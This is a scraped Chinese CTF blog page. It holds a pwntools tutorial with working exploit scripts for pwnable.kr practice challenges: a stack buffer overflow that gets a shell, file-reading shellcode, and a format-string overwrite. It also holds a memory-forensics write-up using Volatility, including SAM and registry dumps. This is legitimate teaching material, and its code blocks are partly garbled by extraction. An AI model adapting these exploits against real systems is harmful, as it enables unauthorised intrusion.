<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;``#include &lt;string.h&gt;``#include &lt;stdlib.h&gt;``void func(``int` `key)&#123;``    ``char overflowme[``32``];``    ``printf(``&quot;overflow me : &quot;``);``    ``gets(overflowme);    ``/``/` `smash me!``    ``if``(key ``=``=` `0xcafebabe``)&#123;``        ``system(``&quot;/bin/sh&quot;``);``    ``&#125;``    ``else``&#123;``        ``printf(``&quot;Nah..\n&quot;``);``    ``&#125;``&#125;``int` `main(``int` `argc, char``*` `argv[])&#123;``    ``func(``0xdeadbeef``);``    ``return` `0``;``&#125;</span><br></pre></td></tr></table></figure>

<p>pwntools脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*``c ``=` `remote(``&quot;pwnable.kr&quot;``, ``9000``) ``c.sendline(``&quot;AAAA&quot;` `*` `13` `+` `p32(``0xcafebabe``))``c.interactive()</span><br></pre></td></tr></table></figure>

<p>源码简洁明了，我们只需要将<strong>key</strong>改写成<code>0xcafebabe</code>。</p>
<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 <code>c</code>). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
<ul>
<li><code>send(payload)</code> 发送payload</li>
<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li>
<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
<li><code>recvline()</code> 接收一行输出</li>
<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
<li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li>
</ul>
<p>在第三行中, <code>p32()</code> 可以让我们转换整数到小端序格式. <code>p32</code> 转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到<strong>key</strong>的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。</p>
<p>最后，我们成功getshell了. 这时，你可能想发送命令进行交互. <code>c.interactive()</code> 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .</p>
<p><img src="https://bbs.pediy.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png" alt="图片描述"></p>
<h2 id="写-Shellcode"><a href="#写-Shellcode" class="headerlink" title="写 Shellcode"></a>写 Shellcode</h2><p>下一题是pwnable.kr的asm. 你需要用 <code>ssh -p2222 asm@pwnable.kr</code> 并输入密码 <code>guest</code> 来查看可执行文件和源码. 这里，我们只展示利用代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*` `p ``=` `process(``&quot;./asm&quot;``)``context.log_level ``=` `&apos;DEBUG&apos;``gdb.attach(p)` `context(arch``=``&apos;amd64&apos;``, os``=``&apos;linux&apos;``)` `shellcode ``=` `shellcraft.amd64.pushstr(``&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;``)``shellcode ``+``=` `shellcraft.amd64.linux.``open``(``&apos;rsp&apos;``,``0``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.read(``&apos;rax&apos;``,``&apos;rsp&apos;``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.write(``1``, ``&apos;rsp&apos;``, ``100``)` `p.recvuntil(``&apos;shellcode: &apos;``)``p.send(asm(shellcode))``log.success(p.recvall())</span><br></pre></td></tr></table></figure>

<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br><code>process</code> 和 <code>remote</code> 累死.  <code>remote</code> 连接远程主机, <code>process</code> 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, <code>process</code> 返回的对象可以通过 <code>gdb.attach(p)</code> 将进程attach到gdb上. Attach 之后,  gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).</p>
<p><img src="https://bbs.pediy.com/upload/attach/201901/3_QGGWTB3XTZ6JTC5.png" alt="图片描述"></p>
<blockquote>
<p>提醒一下，如果你想在命令行中使用gdb.attach(), 便需要安装并运行 tmux. <a href="https://hackernoon.com/a-gentle-introduction-to-tmux-8d784c404340" target="_blank" rel="noopener">更多关于tmux的信息</a>.</p>
</blockquote>
<p>当我们想查看服务器输出时，并不需要在每个 <code>recvline</code> 或者 <code>recvuntil</code> 前加 <code>print</code>. 当 <code>context.log_level</code> 被设置为 <code>&quot;DEBUG&quot;</code> , 我们的输入和服务器的输出会被直接输出.</p>
<p><code>shellcraft</code> 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 <em>open</em> 了一个文件并 <em>read</em> 文件到 <em>stdout</em>. 关于这个类更多的文档, 你可以查阅 <a href="http://docs.pwntools.com/en/stable/shellcraft.html" target="_blank" rel="noopener">官方文档</a>.</p>
<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*``import` `tempfile` `program ``=` `tempfile.mktemp()``source  ``=` `program ``+` `&quot;.c&quot;``write(source, ``&apos;&apos;&apos;``#include &lt;stdio.h&gt;``#include &lt;stdlib.h&gt;``#include &lt;unistd.h&gt;``#include &lt;sys/mman.h&gt;``#define MEMORY_ADDRESS ((void*)0x11111000)``#define MEMORY_SIZE 1024``#define TARGET ((int *) 0x11111110)``int main(int argc, char const *argv[])``&#123;``       ``char buff[1024];``       ``void *ptr = NULL;``       ``int *my_var = TARGET;``       ``ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);``       ``if(ptr != MEMORY_ADDRESS)``       ``&#123;``               ``perror(&quot;mmap&quot;);``               ``return EXIT_FAILURE;``       ``&#125;``       ``*my_var = 0x41414141;``       ``write(1, &amp;my_var, sizeof(int *));``       ``scanf(&quot;%s&quot;, buff);``       ``dprintf(2, buff);``       ``write(1, my_var, sizeof(int));``       ``return 0;``&#125;&apos;&apos;&apos;``)``cmdline ``=` `[``&quot;gcc&quot;``, source, ``&quot;-Wno-format-security&quot;``, ``&quot;-m32&quot;``, ``&quot;-o&quot;``, program]``process(cmdline).wait_for_close()``def` `exec_fmt(payload):``    ``p ``=` `process(program)``    ``p.sendline(payload)``    ``return` `p.recvall()` `autofmt ``=` `FmtStr(exec_fmt)``offset ``=` `autofmt.offset``p ``=` `process(program, stderr``=``PIPE)``addr ``=` `u32(p.recv(``4``))``payload ``=` `fmtstr_payload(offset, &#123;addr: ``0x1337babe``&#125;)``p.sendline(payload)``print` `hex``(unpack(p.recv(``4``)))</span><br></pre></td></tr></table></figure>

<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: <code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload <a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">fmtstr_payload</a>.</p>
<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*` `e ``=` `ELF(``&apos;./example_file&apos;``)``print` `hex``(e.address)  ``# 0x400000``print` `hex``(e.symbols[``&apos;write&apos;``]) ``# 0x401680``print` `hex``(e.got[``&apos;write&apos;``]) ``# 0x60b070``print` `hex``(e.plt[``&apos;write&apos;``]) ``# 0x401680``offset ``=` `e.symbols[``&apos;system&apos;``] ``-` `e.symbols[``&apos;printf&apos;``] ``# calculate offset``binsh_address ``=` `next``(e.search(``&apos;/bin/sh\x00&apos;``)) ``# find address which contains /bin/sh</span><br></pre></td></tr></table></figure>

<p>和 <code>process()</code> 一样, 我们只用将路径给 <code>ELF(path)</code> 即可分析 ELF.</p>
<p>我们有以下几种方法操纵ELF:</p>
<ul>
<li><code>symbols[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的地址</li>
<li><code>got[&#39;a_function&#39;]</code> 找到 <code>a_function</code>的 got </li>
<li><code>plt[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的 plt</li>
<li><code>next(e.search(&quot;some_characters&quot;))</code> 找到包含 <code>some_characters</code>（字符串，汇编代码或者某个数值）的地址. </li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Pwntools 是一套十分强大的工具. 在本文中, 我介绍了最常用的几个api, 但 pwntools 还有很多其他强大的api，诸如 qemu, adb. 各位可通过官方文档进行剩余的学习</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/10/╗ñ═°▒¡2019-MISC-baby-forensic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/10/╗ñ═°▒¡2019-MISC-baby-forensic/" class="post-title-link" itemprop="url">护网杯2019-MISC-baby_forensic</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-10 23:39:57" itemprop="dateCreated datePublished" datetime="2019-09-10T23:39:57-07:00">2019-09-10</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-11 14:40:28" itemprop="dateModified" datetime="2019-09-11T14:40:28-07:00">2019-09-11</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一题以内存取证为主题，包含着密码学和USB流量分析的杂项题，还是很有趣的，首先我们拿到了一个名为<strong>data.vmem</strong>的内存文件，可以知道这就是内存取证的题目</p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>我们需要使用到一个叫做<strong>volatility</strong>的内存取证神器</p>
<p><strong>Volatility</strong>是开源的<strong>Windows</strong>，<strong>Linux</strong>，<strong>macOS</strong>，<strong>Android</strong>的内存取证分析工具，由<strong>Python</strong>编写成，命令行操作，支持各种操作系统</p>
<h3 id="使用Volatility"><a href="#使用Volatility" class="headerlink" title="使用Volatility"></a>使用Volatility</h3><p>判断镜像信息，获取操作系统类型</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img/raw/... imageinfo</span><br></pre></td></tr></table></figure>

<p>知道操作系统类型后，用<code>--profile</code>指定</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img --profile=...</span><br></pre></td></tr></table></figure>

<p>查看当前显示的notepad文本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 notepad</span><br></pre></td></tr></table></figure>

<p>查看当前运行的进程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 psscan/pslist</span><br></pre></td></tr></table></figure>

<p>扫描所有的文件列表(常常结合grep)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 filescan</span><br></pre></td></tr></table></figure>

<p>常常配合的grep为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| grep "doc\|docx\|rtf" //查看文档</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| grep "jpg\|jpeg\|png\|tif\|gif\|bmp"//查看图片</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| grep "Desktop"//查看桌面</span><br></pre></td></tr></table></figure>

<p>根据offset提取出文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x.....</span><br></pre></td></tr></table></figure>

<p>扫描 Windows 的服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile=WinXPSP2x86 svcscan</span><br></pre></td></tr></table></figure>

<p>查看网络连接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile=WinXPSP2x86 connscan</span><br></pre></td></tr></table></figure>

<p>查看命令行上的操作</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure>

<p>根据pid dump出相应的进程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f easy_dump.img --profile=Win7SP1x64 memdump -p 2580 -D 目录</span><br></pre></td></tr></table></figure>

<p>查看截图</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile=Win7SP1x64 screenshot --dump-dir=.</span><br></pre></td></tr></table></figure>

<p>获取 IE 浏览器的使用情况</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 iehistory</span><br></pre></td></tr></table></figure>

<p>列举缓存在内存的注册表</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 hivelist</span><br></pre></td></tr></table></figure>

<p>打印出注册表中的数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 hivedump -o 注册表的 virtual 地址</span><br></pre></td></tr></table></figure>

<p>获取SAM表中的用户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 printkey -K “SAM\Domains\Account\Users\Names”</span><br></pre></td></tr></table></figure>

<p>获取最后登录系统的账户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 printkey -K “SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”</span><br></pre></td></tr></table></figure>

<p>提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem –profile=WinXPSP2x86 userassist</span><br></pre></td></tr></table></figure>

<h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><h4 id="获取镜像信息"><a href="#获取镜像信息" class="headerlink" title="获取镜像信息"></a>获取镜像信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/root/文档/baby_forensic/data.vmem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0xb18000L</span><br><span class="line">                          KDBG : 0x80546ae0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 3</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2019-09-04 14:28:47 UTC+0000</span><br><span class="line">     Image local date and time : 2019-09-04 22:28:47 +0800</span><br></pre></td></tr></table></figure>

<p>可以知道这个镜像是WindowsXP的内存镜像我们接下来继续取证</p>
<h4 id="搜索进程"><a href="#搜索进程" class="headerlink" title="搜索进程"></a>搜索进程</h4><p>首先我们要看一下出题人在镜像里干了什么</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class="line">---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0x817bd830 System                    4      0     58      173 ------      0                                                              </span><br><span class="line">0x8163eb88 smss.exe                372      4      3       19 ------      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x814229d8 csrss.exe               460    372     10      400      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x813c1020 winlogon.exe            484    372     24      462      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x81560020 services.exe            668    484     16      270      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x812b7cd0 lsass.exe               680    484     25      359      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x816c8cc8 vmacthlp.exe            836    668      1       25      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x81333b38 svchost.exe             848    668     21      201      0      0 2019-09-04 14:27:46 UTC+0000                                 </span><br><span class="line">0x812fa020 svchost.exe             932    668     11      263      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x80ed83c0 svchost.exe            1028    668     71     1193      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x81559020 svchost.exe            1072    668      5       59      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x81330020 svchost.exe            1116    668     15      201      0      0 2019-09-04 14:27:47 UTC+0000                                 </span><br><span class="line">0x81433420 explorer.exe           1428   1392     15      370      0      0 2019-09-04 14:27:48 UTC+0000                                 </span><br><span class="line">0x81323c20 spoolsv.exe            1564    668     15      138      0      0 2019-09-04 14:27:48 UTC+0000                                 </span><br><span class="line">0x815f2020 svchost.exe            1976    668      5       88      0      0 2019-09-04 14:28:05 UTC+0000                                 </span><br><span class="line">0x815f1da0 VGAuthService.e         188    668      2       60      0      0 2019-09-04 14:28:05 UTC+0000                                 </span><br><span class="line">0x81542da0 vmtoolsd.exe            256    668      9      266      0      0 2019-09-04 14:28:05 UTC+0000                                 </span><br><span class="line">0x80e848b0 wmiprvse.exe            988    848      9      190      0      0 2019-09-04 14:28:13 UTC+0000                                 </span><br><span class="line">0x80e81020 alg.exe                1172    668      7      110      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x81534020 rundll32.exe           1220   1428      4       78      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x815ddda0 vmtoolsd.exe           1660   1428      7      175      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x80e7b020 ctfmon.exe             1668   1428      1       71      0      0 2019-09-04 14:28:14 UTC+0000                                 </span><br><span class="line">0x80eaab78 wscntfy.exe            1088   1028      1       39      0      0 2019-09-04 14:28:15 UTC+0000                                 </span><br><span class="line">0x81528090 cmd.exe                1636   1428      1       34      0      0 2019-09-04 14:28:34 UTC+0000                                 </span><br><span class="line">0x815258b0 conime.exe             1676   1636      1       38      0      0 2019-09-04 14:28:34 UTC+0000                                 </span><br><span class="line">0x80ea56a8 wordpad.exe            1448   1428      4      113      0      0 2019-09-04 14:28:42 UTC+0000</span><br></pre></td></tr></table></figure>

<p>可以看到这里有两个值得关注的应用程序进程,分别是<strong>wordpad.exe</strong>、<strong>cmd.exe</strong>，但是我们还是没法得出出题人到底在干嘛，我们进行下一步</p>
<h4 id="查看截图"><a href="#查看截图" class="headerlink" title="查看截图"></a>查看截图</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/session_0.WinSta0.Default.png" alt></p>
<p>好像还是不知道在干什么，只可以知道大概是开启了一个<strong>cmd</strong>，然后启动了一个类似<strong>wireshark</strong>的程序，也许正在抓包</p>
<h4 id="查看CMD命令"><a href="#查看CMD命令" class="headerlink" title="查看CMD命令"></a>查看CMD命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">CommandProcess: csrss.exe Pid: 460</span><br><span class="line">CommandHistory: 0x36e3850 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 1 LastAdded: 0 LastDisplayed: 0</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x5e0</span><br><span class="line">Cmd #0 @ 0x55d868: hill_matrix 3,2,2,9,7,7,6,4,9</span><br></pre></td></tr></table></figure>

<p>这里获得了一个重要的信息：<strong>hill_matrix 3,2,2,9,7,7,6,4,9</strong></p>
<h4 id="查看可疑文件"><a href="#查看可疑文件" class="headerlink" title="查看可疑文件"></a>查看可疑文件</h4><p>查看文档：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x000000000181c2c8      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\shdocvw.dll</span><br><span class="line">0x00000000019333d8      1      0 R--rw- \Device\HarddiskVolume1\WINDOWS\system32\mydocs.dll</span><br><span class="line">0x0000000001a4c658      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\shdocvw.dll</span><br></pre></td></tr></table></figure>

<p>查看图片：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tures\Administrator.bmp</span><br><span class="line">0x00000000017e02d0      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\wlnotify.dll</span><br><span class="line">0x0000000001a44f28      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\Web\Wallpaper\Bliss.bmp</span><br><span class="line">0x0000000001aa0868      1      0 R--rwd \Device\HarddiskVolume1\WINDOWS\system32\wlnotify.dll</span><br></pre></td></tr></table></figure>

<p>查看桌面：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000000012d8ef8      1      0 R--r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\disk.zip</span><br><span class="line">0x00000000017e1f90      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\「开始」菜单\程序\附件\远程桌面连接.lnk</span><br><span class="line">0x000000000186f6a8      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\桌面</span><br><span class="line">0x000000000186f740      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面</span><br></pre></td></tr></table></figure>

<p>可以发现桌面上存在着一个<strong>disk.zip</strong>，我们把它<strong>dump</strong>出来解压可以得到一个<strong>disk.img</strong>文件，解压我们可以直接得到一个流量抓包文件<strong>usb.pcapng</strong>，这样子验证了我们的猜想，当时的确是再用<strong>wireshark</strong>抓包，且还可知这是一个<strong>USB</strong>协议流量包</p>
<h2 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h2><p>把拿到的<strong>usb.pcapng</strong>文件拖进wireshark分析</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%8A%A4%E7%BD%91%E6%9D%AF2019-MISC-baby_forensic/QQ%E6%88%AA%E5%9B%BE20190910153112.png" alt></p>
<p>可以知道这的确是个USB流量，开始前，我们先介绍一些USB的基础知识。USB有不同的规格，以下是使用USB的三种方式：<strong>USB UART、USB HID、USB Memory</strong></p>
<p>UART或者Universal Asynchronous Receiver/Transmitter。这种方式下，设备只是简单的将USB用于接受和发射数据，除此之外就再没有其他通讯功能了。</p>
<p>HID是人性化的接口。这一类通讯适用于交互式，有这种功能的设备有：键盘，鼠标，游戏手柄和数字显示设备。</p>
<p>最后是USB Memory，或者说是数据存储。External HDD, thumb drive / flash drive,等都是这一类的。</p>
<p>其中使用的最广的不是USB HID 就是USB Memory了。</p>
<p>每一个USB设备（尤其是HID或者Memory）都有一个供应商ID（Vendor Id）和产品识别码（Product Id）。Vendor Id是用来标记哪个厂商生产了这个USB设备。Product Id用来标记不同的产品，他并不是一个特殊的数字，当然最好不同</p>
<p>我们分析可以知道，USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r example.pcap -T fields -e usb.capdata //如果想导入usbdata.txt文件中，后面加上参数：&gt;usbdata.txt</span><br></pre></td></tr></table></figure>

<p>USB数据包长度为八个字节，这里我们只关注USB流量中的键盘流量和鼠标流量</p>
<p>键盘数据包的数据长度为<strong>8</strong>个字节，击键信息集中在第<strong>3</strong>个字节，每次<strong>key stroke</strong>都会产生一个<strong>keyboard event usb packet</strong></p>
<p>鼠标数据包的数据长度为<strong>4</strong>个字节，第<strong>一</strong>个字节代表<strong>按键</strong>，当取<strong>0x00</strong>时，代表<strong>没有按键</strong>、为<strong>0x01</strong>时，代表按<strong>左键</strong>，为<strong>0x02</strong>时，代表当前按键为<strong>右键</strong>。第二个字节可以看成是一个<strong>signed   byte</strong>类型，其最高位为符号位，当这个值为<strong>正</strong>时，代表鼠标<strong>水平右移</strong>多少像素，为<strong>负</strong>时，代表<strong>水平左移</strong>多少像素。第三个字节与第二字节类似，代表<strong>垂直上下移动</strong>的偏移</p>
<blockquote>
<p>usb keyboard的映射表 根据这个映射表将第三个字节取出来，对应对照表得到解码</p>
